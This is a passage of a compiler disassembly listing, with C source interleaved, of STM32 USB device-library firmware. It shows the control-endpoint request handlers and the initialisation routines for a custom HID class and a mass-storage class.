      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c29e:	687b      	ldr	r3, [r7, #4]
 800c2a0:	330c      	adds	r3, #12
 800c2a2:	2202      	movs	r2, #2
 800c2a4:	4619      	mov	r1, r3
 800c2a6:	6878      	ldr	r0, [r7, #4]
 800c2a8:	f000 f900 	bl	800c4ac <USBD_CtlSendData>
      break;
 800c2ac:	e004      	b.n	800c2b8 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c2ae:	6839      	ldr	r1, [r7, #0]
 800c2b0:	6878      	ldr	r0, [r7, #4]
 800c2b2:	f000 f88a 	bl	800c3ca <USBD_CtlError>
      break;
 800c2b6:	bf00      	nop
  }
}
 800c2b8:	bf00      	nop
 800c2ba:	3708      	adds	r7, #8
 800c2bc:	46bd      	mov	sp, r7
 800c2be:	bd80      	pop	{r7, pc}

0800c2c0 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c2c0:	b580      	push	{r7, lr}
 800c2c2:	b082      	sub	sp, #8
 800c2c4:	af00      	add	r7, sp, #0
 800c2c6:	6078      	str	r0, [r7, #4]
 800c2c8:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c2ca:	683b      	ldr	r3, [r7, #0]
 800c2cc:	885b      	ldrh	r3, [r3, #2]
 800c2ce:	2b01      	cmp	r3, #1
 800c2d0:	d107      	bne.n	800c2e2 <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c2d2:	687b      	ldr	r3, [r7, #4]
 800c2d4:	2201      	movs	r2, #1
 800c2d6:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c2da:	6878      	ldr	r0, [r7, #4]
 800c2dc:	f000 f940 	bl	800c560 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c2e0:	e013      	b.n	800c30a <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c2e2:	683b      	ldr	r3, [r7, #0]
 800c2e4:	885b      	ldrh	r3, [r3, #2]
 800c2e6:	2b02      	cmp	r3, #2
 800c2e8:	d10b      	bne.n	800c302 <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c2ea:	683b      	ldr	r3, [r7, #0]
 800c2ec:	889b      	ldrh	r3, [r3, #4]
 800c2ee:	0a1b      	lsrs	r3, r3, #8
 800c2f0:	b29b      	uxth	r3, r3
 800c2f2:	b2da      	uxtb	r2, r3
 800c2f4:	687b      	ldr	r3, [r7, #4]
 800c2f6:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c2fa:	6878      	ldr	r0, [r7, #4]
 800c2fc:	f000 f930 	bl	800c560 <USBD_CtlSendStatus>
}
 800c300:	e003      	b.n	800c30a <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c302:	6839      	ldr	r1, [r7, #0]
 800c304:	6878      	ldr	r0, [r7, #4]
 800c306:	f000 f860 	bl	800c3ca <USBD_CtlError>
}
 800c30a:	bf00      	nop
 800c30c:	3708      	adds	r7, #8
 800c30e:	46bd      	mov	sp, r7
 800c310:	bd80      	pop	{r7, pc}

0800c312 <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c312:	b580      	push	{r7, lr}
 800c314:	b082      	sub	sp, #8
 800c316:	af00      	add	r7, sp, #0
 800c318:	6078      	str	r0, [r7, #4]
 800c31a:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c31c:	687b      	ldr	r3, [r7, #4]
 800c31e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c322:	b2db      	uxtb	r3, r3
 800c324:	3b01      	subs	r3, #1
 800c326:	2b02      	cmp	r3, #2
 800c328:	d80b      	bhi.n	800c342 <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c32a:	683b      	ldr	r3, [r7, #0]
 800c32c:	885b      	ldrh	r3, [r3, #2]
 800c32e:	2b01      	cmp	r3, #1
 800c330:	d10c      	bne.n	800c34c <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c332:	687b      	ldr	r3, [r7, #4]
 800c334:	2200      	movs	r2, #0
 800c336:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c33a:	6878      	ldr	r0, [r7, #4]
 800c33c:	f000 f910 	bl	800c560 <USBD_CtlSendStatus>
      }
      break;
 800c340:	e004      	b.n	800c34c <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c342:	6839      	ldr	r1, [r7, #0]
 800c344:	6878      	ldr	r0, [r7, #4]
 800c346:	f000 f840 	bl	800c3ca <USBD_CtlError>
      break;
 800c34a:	e000      	b.n	800c34e <USBD_ClrFeature+0x3c>
      break;
 800c34c:	bf00      	nop
  }
}
 800c34e:	bf00      	nop
 800c350:	3708      	adds	r7, #8
 800c352:	46bd      	mov	sp, r7
 800c354:	bd80      	pop	{r7, pc}

0800c356 <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c356:	b580      	push	{r7, lr}
 800c358:	b084      	sub	sp, #16
 800c35a:	af00      	add	r7, sp, #0
 800c35c:	6078      	str	r0, [r7, #4]
 800c35e:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c360:	683b      	ldr	r3, [r7, #0]
 800c362:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c364:	68fb      	ldr	r3, [r7, #12]
 800c366:	781a      	ldrb	r2, [r3, #0]
 800c368:	687b      	ldr	r3, [r7, #4]
 800c36a:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c36c:	68fb      	ldr	r3, [r7, #12]
 800c36e:	3301      	adds	r3, #1
 800c370:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c372:	68fb      	ldr	r3, [r7, #12]
 800c374:	781a      	ldrb	r2, [r3, #0]
 800c376:	687b      	ldr	r3, [r7, #4]
 800c378:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c37a:	68fb      	ldr	r3, [r7, #12]
 800c37c:	3301      	adds	r3, #1
 800c37e:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c380:	68f8      	ldr	r0, [r7, #12]
 800c382:	f7ff fa16 	bl	800b7b2 <SWAPBYTE>
 800c386:	4603      	mov	r3, r0
 800c388:	461a      	mov	r2, r3
 800c38a:	687b      	ldr	r3, [r7, #4]
 800c38c:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c38e:	68fb      	ldr	r3, [r7, #12]
 800c390:	3301      	adds	r3, #1
 800c392:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c394:	68fb      	ldr	r3, [r7, #12]
 800c396:	3301      	adds	r3, #1
 800c398:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c39a:	68f8      	ldr	r0, [r7, #12]
 800c39c:	f7ff fa09 	bl	800b7b2 <SWAPBYTE>
 800c3a0:	4603      	mov	r3, r0
 800c3a2:	461a      	mov	r2, r3
 800c3a4:	687b      	ldr	r3, [r7, #4]
 800c3a6:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c3a8:	68fb      	ldr	r3, [r7, #12]
 800c3aa:	3301      	adds	r3, #1
 800c3ac:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c3ae:	68fb      	ldr	r3, [r7, #12]
 800c3b0:	3301      	adds	r3, #1
 800c3b2:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c3b4:	68f8      	ldr	r0, [r7, #12]
 800c3b6:	f7ff f9fc 	bl	800b7b2 <SWAPBYTE>
 800c3ba:	4603      	mov	r3, r0
 800c3bc:	461a      	mov	r2, r3
 800c3be:	687b      	ldr	r3, [r7, #4]
 800c3c0:	80da      	strh	r2, [r3, #6]
}
 800c3c2:	bf00      	nop
 800c3c4:	3710      	adds	r7, #16
 800c3c6:	46bd      	mov	sp, r7
 800c3c8:	bd80      	pop	{r7, pc}

0800c3ca <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c3ca:	b580      	push	{r7, lr}
 800c3cc:	b082      	sub	sp, #8
 800c3ce:	af00      	add	r7, sp, #0
 800c3d0:	6078      	str	r0, [r7, #4]
 800c3d2:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c3d4:	2180      	movs	r1, #128	; 0x80
 800c3d6:	6878      	ldr	r0, [r7, #4]
 800c3d8:	f000 fd6a 	bl	800ceb0 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c3dc:	2100      	movs	r1, #0
 800c3de:	6878      	ldr	r0, [r7, #4]
 800c3e0:	f000 fd66 	bl	800ceb0 <USBD_LL_StallEP>
}
 800c3e4:	bf00      	nop
 800c3e6:	3708      	adds	r7, #8
 800c3e8:	46bd      	mov	sp, r7
 800c3ea:	bd80      	pop	{r7, pc}

0800c3ec <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c3ec:	b580      	push	{r7, lr}
 800c3ee:	b086      	sub	sp, #24
 800c3f0:	af00      	add	r7, sp, #0
 800c3f2:	60f8      	str	r0, [r7, #12]
 800c3f4:	60b9      	str	r1, [r7, #8]
 800c3f6:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c3f8:	2300      	movs	r3, #0
 800c3fa:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c3fc:	68fb      	ldr	r3, [r7, #12]
 800c3fe:	2b00      	cmp	r3, #0
 800c400:	d036      	beq.n	800c470 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c402:	68fb      	ldr	r3, [r7, #12]
 800c404:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c406:	6938      	ldr	r0, [r7, #16]
 800c408:	f000 f836 	bl	800c478 <USBD_GetLen>
 800c40c:	4603      	mov	r3, r0
 800c40e:	3301      	adds	r3, #1
 800c410:	b29b      	uxth	r3, r3
 800c412:	005b      	lsls	r3, r3, #1
 800c414:	b29a      	uxth	r2, r3
 800c416:	687b      	ldr	r3, [r7, #4]
 800c418:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c41a:	7dfb      	ldrb	r3, [r7, #23]
 800c41c:	68ba      	ldr	r2, [r7, #8]
 800c41e:	4413      	add	r3, r2
 800c420:	687a      	ldr	r2, [r7, #4]
 800c422:	7812      	ldrb	r2, [r2, #0]
 800c424:	701a      	strb	r2, [r3, #0]
  idx++;
 800c426:	7dfb      	ldrb	r3, [r7, #23]
 800c428:	3301      	adds	r3, #1
 800c42a:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c42c:	7dfb      	ldrb	r3, [r7, #23]
 800c42e:	68ba      	ldr	r2, [r7, #8]
 800c430:	4413      	add	r3, r2
 800c432:	2203      	movs	r2, #3
 800c434:	701a      	strb	r2, [r3, #0]
  idx++;
 800c436:	7dfb      	ldrb	r3, [r7, #23]
 800c438:	3301      	adds	r3, #1
 800c43a:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c43c:	e013      	b.n	800c466 <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c43e:	7dfb      	ldrb	r3, [r7, #23]
 800c440:	68ba      	ldr	r2, [r7, #8]
 800c442:	4413      	add	r3, r2
 800c444:	693a      	ldr	r2, [r7, #16]
 800c446:	7812      	ldrb	r2, [r2, #0]
 800c448:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c44a:	693b      	ldr	r3, [r7, #16]
 800c44c:	3301      	adds	r3, #1
 800c44e:	613b      	str	r3, [r7, #16]
    idx++;
 800c450:	7dfb      	ldrb	r3, [r7, #23]
 800c452:	3301      	adds	r3, #1
 800c454:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c456:	7dfb      	ldrb	r3, [r7, #23]
 800c458:	68ba      	ldr	r2, [r7, #8]
 800c45a:	4413      	add	r3, r2
 800c45c:	2200      	movs	r2, #0
 800c45e:	701a      	strb	r2, [r3, #0]
    idx++;
 800c460:	7dfb      	ldrb	r3, [r7, #23]
 800c462:	3301      	adds	r3, #1
 800c464:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c466:	693b      	ldr	r3, [r7, #16]
 800c468:	781b      	ldrb	r3, [r3, #0]
 800c46a:	2b00      	cmp	r3, #0
 800c46c:	d1e7      	bne.n	800c43e <USBD_GetString+0x52>
 800c46e:	e000      	b.n	800c472 <USBD_GetString+0x86>
    return;
 800c470:	bf00      	nop
  }
}
 800c472:	3718      	adds	r7, #24
 800c474:	46bd      	mov	sp, r7
 800c476:	bd80      	pop	{r7, pc}

0800c478 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c478:	b480      	push	{r7}
 800c47a:	b085      	sub	sp, #20
 800c47c:	af00      	add	r7, sp, #0
 800c47e:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c480:	2300      	movs	r3, #0
 800c482:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c484:	687b      	ldr	r3, [r7, #4]
 800c486:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c488:	e005      	b.n	800c496 <USBD_GetLen+0x1e>
  {
    len++;
 800c48a:	7bfb      	ldrb	r3, [r7, #15]
 800c48c:	3301      	adds	r3, #1
 800c48e:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c490:	68bb      	ldr	r3, [r7, #8]
 800c492:	3301      	adds	r3, #1
 800c494:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c496:	68bb      	ldr	r3, [r7, #8]
 800c498:	781b      	ldrb	r3, [r3, #0]
 800c49a:	2b00      	cmp	r3, #0
 800c49c:	d1f5      	bne.n	800c48a <USBD_GetLen+0x12>
  }

  return len;
 800c49e:	7bfb      	ldrb	r3, [r7, #15]
}
 800c4a0:	4618      	mov	r0, r3
 800c4a2:	3714      	adds	r7, #20
 800c4a4:	46bd      	mov	sp, r7
 800c4a6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4aa:	4770      	bx	lr

0800c4ac <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c4ac:	b580      	push	{r7, lr}
 800c4ae:	b084      	sub	sp, #16
 800c4b0:	af00      	add	r7, sp, #0
 800c4b2:	60f8      	str	r0, [r7, #12]
 800c4b4:	60b9      	str	r1, [r7, #8]
 800c4b6:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c4b8:	68fb      	ldr	r3, [r7, #12]
 800c4ba:	2202      	movs	r2, #2
 800c4bc:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c4c0:	68fb      	ldr	r3, [r7, #12]
 800c4c2:	687a      	ldr	r2, [r7, #4]
 800c4c4:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c4c6:	68fb      	ldr	r3, [r7, #12]
 800c4c8:	687a      	ldr	r2, [r7, #4]
 800c4ca:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c4cc:	687b      	ldr	r3, [r7, #4]
 800c4ce:	68ba      	ldr	r2, [r7, #8]
 800c4d0:	2100      	movs	r1, #0
 800c4d2:	68f8      	ldr	r0, [r7, #12]
 800c4d4:	f000 fdbc 	bl	800d050 <USBD_LL_Transmit>

  return USBD_OK;
 800c4d8:	2300      	movs	r3, #0
}
 800c4da:	4618      	mov	r0, r3
 800c4dc:	3710      	adds	r7, #16
 800c4de:	46bd      	mov	sp, r7
 800c4e0:	bd80      	pop	{r7, pc}

0800c4e2 <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c4e2:	b580      	push	{r7, lr}
 800c4e4:	b084      	sub	sp, #16
 800c4e6:	af00      	add	r7, sp, #0
 800c4e8:	60f8      	str	r0, [r7, #12]
 800c4ea:	60b9      	str	r1, [r7, #8]
 800c4ec:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c4ee:	687b      	ldr	r3, [r7, #4]
 800c4f0:	68ba      	ldr	r2, [r7, #8]
 800c4f2:	2100      	movs	r1, #0
 800c4f4:	68f8      	ldr	r0, [r7, #12]
 800c4f6:	f000 fdab 	bl	800d050 <USBD_LL_Transmit>

  return USBD_OK;
 800c4fa:	2300      	movs	r3, #0
}
 800c4fc:	4618      	mov	r0, r3
 800c4fe:	3710      	adds	r7, #16
 800c500:	46bd      	mov	sp, r7
 800c502:	bd80      	pop	{r7, pc}

0800c504 <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c504:	b580      	push	{r7, lr}
 800c506:	b084      	sub	sp, #16
 800c508:	af00      	add	r7, sp, #0
 800c50a:	60f8      	str	r0, [r7, #12]
 800c50c:	60b9      	str	r1, [r7, #8]
 800c50e:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c510:	68fb      	ldr	r3, [r7, #12]
 800c512:	2203      	movs	r2, #3
 800c514:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c518:	68fb      	ldr	r3, [r7, #12]
 800c51a:	687a      	ldr	r2, [r7, #4]
 800c51c:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c520:	68fb      	ldr	r3, [r7, #12]
 800c522:	687a      	ldr	r2, [r7, #4]
 800c524:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c528:	687b      	ldr	r3, [r7, #4]
 800c52a:	68ba      	ldr	r2, [r7, #8]
 800c52c:	2100      	movs	r1, #0
 800c52e:	68f8      	ldr	r0, [r7, #12]
 800c530:	f000 fdc6 	bl	800d0c0 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c534:	2300      	movs	r3, #0
}
 800c536:	4618      	mov	r0, r3
 800c538:	3710      	adds	r7, #16
 800c53a:	46bd      	mov	sp, r7
 800c53c:	bd80      	pop	{r7, pc}

0800c53e <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c53e:	b580      	push	{r7, lr}
 800c540:	b084      	sub	sp, #16
 800c542:	af00      	add	r7, sp, #0
 800c544:	60f8      	str	r0, [r7, #12]
 800c546:	60b9      	str	r1, [r7, #8]
 800c548:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c54a:	687b      	ldr	r3, [r7, #4]
 800c54c:	68ba      	ldr	r2, [r7, #8]
 800c54e:	2100      	movs	r1, #0
 800c550:	68f8      	ldr	r0, [r7, #12]
 800c552:	f000 fdb5 	bl	800d0c0 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c556:	2300      	movs	r3, #0
}
 800c558:	4618      	mov	r0, r3
 800c55a:	3710      	adds	r7, #16
 800c55c:	46bd      	mov	sp, r7
 800c55e:	bd80      	pop	{r7, pc}

0800c560 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c560:	b580      	push	{r7, lr}
 800c562:	b082      	sub	sp, #8
 800c564:	af00      	add	r7, sp, #0
 800c566:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c568:	687b      	ldr	r3, [r7, #4]
 800c56a:	2204      	movs	r2, #4
 800c56c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c570:	2300      	movs	r3, #0
 800c572:	2200      	movs	r2, #0
 800c574:	2100      	movs	r1, #0
 800c576:	6878      	ldr	r0, [r7, #4]
 800c578:	f000 fd6a 	bl	800d050 <USBD_LL_Transmit>

  return USBD_OK;
 800c57c:	2300      	movs	r3, #0
}
 800c57e:	4618      	mov	r0, r3
 800c580:	3708      	adds	r7, #8
 800c582:	46bd      	mov	sp, r7
 800c584:	bd80      	pop	{r7, pc}

0800c586 <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c586:	b580      	push	{r7, lr}
 800c588:	b082      	sub	sp, #8
 800c58a:	af00      	add	r7, sp, #0
 800c58c:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c58e:	687b      	ldr	r3, [r7, #4]
 800c590:	2205      	movs	r2, #5
 800c592:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c596:	2300      	movs	r3, #0
 800c598:	2200      	movs	r2, #0
 800c59a:	2100      	movs	r1, #0
 800c59c:	6878      	ldr	r0, [r7, #4]
 800c59e:	f000 fd8f 	bl	800d0c0 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c5a2:	2300      	movs	r3, #0
}
 800c5a4:	4618      	mov	r0, r3
 800c5a6:	3708      	adds	r7, #8
 800c5a8:	46bd      	mov	sp, r7
 800c5aa:	bd80      	pop	{r7, pc}

0800c5ac <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c5ac:	b580      	push	{r7, lr}
 800c5ae:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c5b0:	2200      	movs	r2, #0
 800c5b2:	4912      	ldr	r1, [pc, #72]	; (800c5fc <MX_USB_DEVICE_Init+0x50>)
 800c5b4:	4812      	ldr	r0, [pc, #72]	; (800c600 <MX_USB_DEVICE_Init+0x54>)
 800c5b6:	f7fe fd68 	bl	800b08a <USBD_Init>
 800c5ba:	4603      	mov	r3, r0
 800c5bc:	2b00      	cmp	r3, #0
 800c5be:	d001      	beq.n	800c5c4 <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c5c0:	f7f4 fc7e 	bl	8000ec0 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c5c4:	490f      	ldr	r1, [pc, #60]	; (800c604 <MX_USB_DEVICE_Init+0x58>)
 800c5c6:	480e      	ldr	r0, [pc, #56]	; (800c600 <MX_USB_DEVICE_Init+0x54>)
 800c5c8:	f7fe fd8f 	bl	800b0ea <USBD_RegisterClass>
 800c5cc:	4603      	mov	r3, r0
 800c5ce:	2b00      	cmp	r3, #0
 800c5d0:	d001      	beq.n	800c5d6 <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c5d2:	f7f4 fc75 	bl	8000ec0 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c5d6:	490c      	ldr	r1, [pc, #48]	; (800c608 <MX_USB_DEVICE_Init+0x5c>)
 800c5d8:	4809      	ldr	r0, [pc, #36]	; (800c600 <MX_USB_DEVICE_Init+0x54>)
 800c5da:	f7fc fca5 	bl	8008f28 <USBD_CUSTOM_HID_RegisterInterface>
 800c5de:	4603      	mov	r3, r0
 800c5e0:	2b00      	cmp	r3, #0
 800c5e2:	d001      	beq.n	800c5e8 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c5e4:	f7f4 fc6c 	bl	8000ec0 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c5e8:	4805      	ldr	r0, [pc, #20]	; (800c600 <MX_USB_DEVICE_Init+0x54>)
 800c5ea:	f7fe fdb4 	bl	800b156 <USBD_Start>
 800c5ee:	4603      	mov	r3, r0
 800c5f0:	2b00      	cmp	r3, #0
 800c5f2:	d001      	beq.n	800c5f8 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c5f4:	f7f4 fc64 	bl	8000ec0 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c5f8:	bf00      	nop
 800c5fa:	bd80      	pop	{r7, pc}
 800c5fc:	200001ac 	.word	0x200001ac
 800c600:	200003c0 	.word	0x200003c0
 800c604:	2000002c 	.word	0x2000002c
 800c608:	2000019c 	.word	0x2000019c

0800c60c <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c60c:	b580      	push	{r7, lr}
 800c60e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c610:	2200      	movs	r2, #0
 800c612:	4912      	ldr	r1, [pc, #72]	; (800c65c <MX_USB_DEVICE_Init_MSC+0x50>)
 800c614:	4812      	ldr	r0, [pc, #72]	; (800c660 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c616:	f7fe fd38 	bl	800b08a <USBD_Init>
 800c61a:	4603      	mov	r3, r0
 800c61c:	2b00      	cmp	r3, #0
 800c61e:	d001      	beq.n	800c624 <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c620:	f7f4 fc4e 	bl	8000ec0 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c624:	490f      	ldr	r1, [pc, #60]	; (800c664 <MX_USB_DEVICE_Init_MSC+0x58>)
 800c626:	480e      	ldr	r0, [pc, #56]	; (800c660 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c628:	f7fe fd5f 	bl	800b0ea <USBD_RegisterClass>
 800c62c:	4603      	mov	r3, r0
 800c62e:	2b00      	cmp	r3, #0
 800c630:	d001      	beq.n	800c636 <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c632:	f7f4 fc45 	bl	8000ec0 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c636:	490c      	ldr	r1, [pc, #48]	; (800c668 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c638:	4809      	ldr	r0, [pc, #36]	; (800c660 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c63a:	f7fc ff27 	bl	800948c <USBD_MSC_RegisterStorage>
 800c63e:	4603      	mov	r3, r0
 800c640:	2b00      	cmp	r3, #0
 800c642:	d001      	beq.n	800c648 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
